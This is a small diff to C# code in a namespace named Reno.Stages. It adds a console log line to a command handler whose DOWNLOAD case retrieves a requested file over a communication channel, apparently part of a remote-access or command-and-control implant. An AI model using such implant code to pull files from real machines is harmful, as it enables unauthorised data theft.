@@ -93,6 +93,7 @@ namespace Reno.Stages
                         case CommChannel.DOWNLOAD:
                             byte[] fileToDownload = channel.Decompress(channel.ReceiveBytes(header.DataLength));
                             string fileDownload = GetFullPath(Encoding.UTF8.GetString(fileToDownload));
+                            Console.WriteLine("[*] File download requested for {0}", fileDownload);
                             DownloadFile(header, fileDownload);
                             break;
                         case CommChannel.NETSTAT:
